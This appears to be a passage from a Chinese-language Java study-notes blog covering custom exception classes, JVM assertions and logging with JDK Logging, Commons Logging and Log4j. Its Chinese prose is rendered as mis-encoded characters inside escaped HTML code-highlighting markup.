&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">BaseException&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">RuntimeException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">BaseException&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">BaseException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">message&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Throwable&lt;/span> &lt;span style="color:#111">cause&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">message&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">cause&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">BaseException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">message&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">message&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">BaseException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Throwable&lt;/span> &lt;span style="color:#111">cause&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cause&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™æ ·ï¼ŒæŠ›å‡ºå¼‚å¸¸çš„æ—¶å€™ï¼Œå°±å¯ä»¥é€‰æ‹©åˆé€‚çš„æž„é€ æ–¹æ³•&lt;/p>
&lt;h3 id="æ–­è¨€">æ–­è¨€&lt;/h3>
&lt;ul>
&lt;li>JVMé»˜è®¤å…³é—­æ–­è¨€æŒ‡ä»¤ï¼Œéœ€ä¼ å…¥&lt;code>-enableassertions&lt;/code>æˆ–&lt;code>-ea&lt;/code>ï¼›è¿˜å¯ä»¥æœ‰é€‰æ‹©åœ°å¯¹ç‰¹å®šåœ°ç±»å¯ç”¨æ–­è¨€ï¼Œå‘½ä»¤è¡Œå‚æ•°æ˜¯ï¼š&lt;code>-ea:com.itranswarp.sample.Main&lt;/code>ï¼Œè¡¨ç¤ºåªå¯¹&lt;code>com.itranswarp.sample.Main&lt;/code>è¿™ä¸ªç±»å¯ç”¨æ–­è¨€ï¼›æˆ–è€…å¯¹ç‰¹å®šåœ°åŒ…å¯ç”¨æ–­è¨€ï¼Œå‘½ä»¤è¡Œå‚æ•°æ˜¯ï¼š&lt;code>-ea:com.itranswarp.sample...&lt;/code>ï¼ˆæ³¨æ„ç»“å°¾æœ‰3ä¸ª&lt;code>.&lt;/code>ï¼‰ï¼Œè¡¨ç¤ºå¯¹&lt;code>com.itranswarp.sample&lt;/code>è¿™ä¸ªåŒ…å¯åŠ¨æ–­è¨€&lt;/li>
&lt;li>æ˜¯ä¸€ç§è°ƒè¯•æ–¹å¼ï¼Œå¤±è´¥æ—¶ä¼šæŠ›å‡º&lt;code>AssertionError&lt;/code>ï¼Œå¯¼è‡´ç¨‹åºç»“æŸé€€å‡º&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">double&lt;/span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Math&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">abs&lt;/span>&lt;span style="color:#f92672">(-&lt;/span>&lt;span style="color:#111">123&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">45&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#111">0&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;x must &amp;gt;= 0&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// ä¼šå¸¦ä¸Šæ¶ˆæ¯
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>ä¸èƒ½ç”¨äºŽå¯æ¢å¤çš„ç¨‹åºé”™è¯¯ï¼Œåªåº”è¯¥ç”¨äºŽå¼€å‘å’Œæµ‹è¯•é˜¶æ®µï¼Œå¯¹äºŽå¯æ¢å¤çš„ç¨‹åºé”™è¯¯ï¼Œä¸åº”è¯¥ä½¿ç”¨æ–­è¨€&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">sort&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">arr&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">arr&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>åº”è¯¥ç›´æŽ¥æ•èŽ·äº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">sort&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">arr&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">arr&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">IllegalArgumentException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;array cannot be null&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="æ—¥å¿—">æ—¥å¿—&lt;/h2>
&lt;p>ä¸ºäº†å–ä»£&lt;code>System.out.println()&lt;/code>ï¼Œå°è£…å¥½äº†å¾ˆå¤šå¥½ç”¨çš„æ–¹æ³•&lt;/p>
&lt;h3 id="jdk-logging">JDK Logging&lt;/h3>
&lt;p>æ ‡å‡†åº“è‡ªå¸¦&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.logging.Level&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.logging.Logger&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Hello&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Logger&lt;/span> &lt;span style="color:#111">logger&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Logger&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getGlobal&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">logger&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">info&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;start process...&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">logger&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">warning&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;memory is running out...&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">logger&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">fine&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ignored.&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">logger&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">severe&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;process will be terminated...&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>JDKçš„Loggingå®šä¹‰äº†7ä¸ªæ—¥å¿—çº§åˆ«ï¼Œä»Žä¸¥é‡åˆ°æ™®é€š&lt;/li>
&lt;/ul>
&lt;p>SEVERE, WARNING, INFO(default), CONFIG, FINE, FINER, FINEST&lt;/p>
&lt;ul>
&lt;li>å±€é™ï¼šé…ç½®ä¸å¤ªæ–¹ä¾¿ï¼Œéœ€è¦åœ¨JVMå¯åŠ¨æ—¶ä¼ é€’å‚æ•°&lt;code>-Djava.util.logging.config.file=&amp;lt;config-file-name&amp;gt;&lt;/code>ï¼Œä¸€æ—¦å¼€å§‹è¿è¡Œ&lt;code>main()&lt;/code>æ–¹æ³•ï¼Œå°±æ— æ³•ä¿®æ”¹é…ç½®&lt;/li>
&lt;/ul>
&lt;h3 id="commons-logging">Commons Logging&lt;/h3>
&lt;p>ç¬¬ä¸‰æ–¹ï¼Œç”±Apacheåˆ›å»ºï¼Œå¯ä»¥æŒ‚æŽ¥ä¸åŒçš„æ—¥å¿—ç³»ç»Ÿï¼Œå¹¶é€šè¿‡é…ç½®æ–‡ä»¶æŒ‡å®šæŒ‚æŽ¥çš„æ—¥å¿—ç³»ç»Ÿ&lt;/p>
&lt;p>å¯ä½œä¸ºæ—¥å¿—æŽ¥å£ï¼Œè€Œéžæ—¥å¿—å®žçŽ°&lt;/p>
&lt;ul>
&lt;li>é»˜è®¤æœç´¢Log4jï¼Œæ²¡æœ‰çš„è¯ç”¨JDK Logging&lt;/li>
&lt;li>ä½¿ç”¨å¾ˆç®€å•&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.logging.Log&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.logging.LogFactory&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Log&lt;/span> &lt;span style="color:#111">log&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LogFactory&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getLog&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Main&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// èŽ·å–å®žä¾‹
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">log&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">info&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;start...&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// æ‰“å°æ—¥å¿—
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">log&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">warn&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;end.&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>6ä¸ªæ—¥å¿—çº§åˆ«&lt;/li>
&lt;/ul>
&lt;p>FATAL, ERROR, WARNING, INFO(default), DEBUG, TRACE&lt;/p>
&lt;ul>
&lt;li>é™¤&lt;code>info(String)&lt;/code>å¤–è¿˜æœ‰&lt;code>info(String, Throwable)&lt;/code>è¿™æ ·ä¸€ä¸ªé‡è½½æ–¹æ³•ï¼Œä¾¿äºŽæ›´ç®€å•åœ°è®°å½•å¼‚å¸¸&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">log&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;got exception!&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>å¦‚æžœåœ¨é™æ€æ–¹æ³•ä¸­å¼•ç”¨&lt;code>Log&lt;/code>ï¼Œé€šå¸¸ç›´æŽ¥å®šä¹‰ä¸€ä¸ªé™æ€ç±»åž‹å˜é‡ï¼š&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// åœ¨é™æ€æ–¹æ³•ä¸­å¼•ç”¨Log:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Log&lt;/span> &lt;span style="color:#111">log&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LogFactory&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getLog&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Main&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">foo&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">log&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">info&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;foo&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>åœ¨å®žä¾‹æ–¹æ³•ä¸­å¼•ç”¨&lt;code>Log&lt;/code>ï¼Œé€šå¸¸å®šä¹‰ä¸€ä¸ªå®žä¾‹å˜é‡&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// åœ¨å®žä¾‹æ–¹æ³•ä¸­å¼•ç”¨Log:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Log&lt;/span> &lt;span style="color:#111">log&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LogFactory&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getLog&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">getClass&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">foo&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">log&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">info&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;foo&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>ä¸Šé¢å±•ç¤ºäº†ä¸¤ç§&lt;code>getLog()&lt;/code>çš„æ–¹å¼ï¼Œç¬¬äºŒç§çš„å¥½å¤„æ˜¯å­ç±»å¯ä»¥ç›´æŽ¥ä½¿ç”¨è¯¥å®žä¾‹ï¼ŒåŽŸå› æ˜¯Javaçš„åŠ¨æ€ç‰¹æ€§ï¼Œå­ç±»èŽ·å–çš„&lt;code>Log&lt;/code>å­—æ®µå®žé™…ä¸Šç›¸å½“äºŽ&lt;code>LogFactory.getLog(Student.class)&lt;/code>ï¼Œä½†å´æ˜¯ä»Žçˆ¶ç±»ç»§æ‰¿è€Œæ¥ï¼Œå¹¶ä¸”æ— éœ€æ”¹åŠ¨ä»£ç &lt;/li>
&lt;/ul>
&lt;h3 id="log4j">Log4j&lt;/h3>
&lt;p>æ—¥å¿—å®žçŽ°ï¼ˆä¹ï¼‰Log4jï¼Œæˆ‘çœŸçš„å¥½å–œæ¬¢ä½ å•Šï¼ä¸ºäº†ä½ ï¼Œæˆ‘ä¸è¦ç”¨æ— åºåˆ—è¡¨äº†ï¼ï¼ï¼&lt;/p>
&lt;p>Log4jæ˜¯ä¸€ä¸ªç»„ä»¶åŒ–è®¾è®¡çš„æ—¥å¿—ç³»ç»Ÿï¼Œå®ƒçš„æž¶æž„å¤§è‡´å¦‚ä¸‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220227012115179.png" alt="image-20220227012115179">&lt;/p>
&lt;p>å½“æˆ‘ä»¬ä½¿ç”¨Log4jè¾“å‡ºä¸€æ¡æ—¥å¿—æ—¶ï¼ŒLog4jè‡ªåŠ¨é€šè¿‡ä¸åŒçš„AppenderæŠŠåŒä¸€æ¡æ—¥å¿—è¾“å‡ºåˆ°ä¸åŒçš„ç›®çš„åœ°&lt;/p>
&lt;ul>
&lt;li>consoleï¼šè¾“å‡ºåˆ°å±å¹•ï¼›&lt;/li>
&lt;li>fileï¼šè¾“å‡ºåˆ°æ–‡ä»¶ï¼›&lt;/li>
&lt;li>socketï¼šé€šè¿‡ç½‘ç»œè¾“å‡ºåˆ°è¿œç¨‹è®¡ç®—æœºï¼›&lt;/li>
&lt;li>jdbcï¼šè¾“å‡ºåˆ°æ•°æ®åº“&lt;/li>
&lt;/ul>
&lt;p>é€šè¿‡Filteræ¥è¿‡æ»¤å“ªäº›logéœ€è¦è¢«è¾“å‡ºï¼Œæœ€åŽï¼Œé€šè¿‡Layoutæ¥æ ¼å¼åŒ–æ—¥å¿—ä¿¡æ¯&lt;/p>
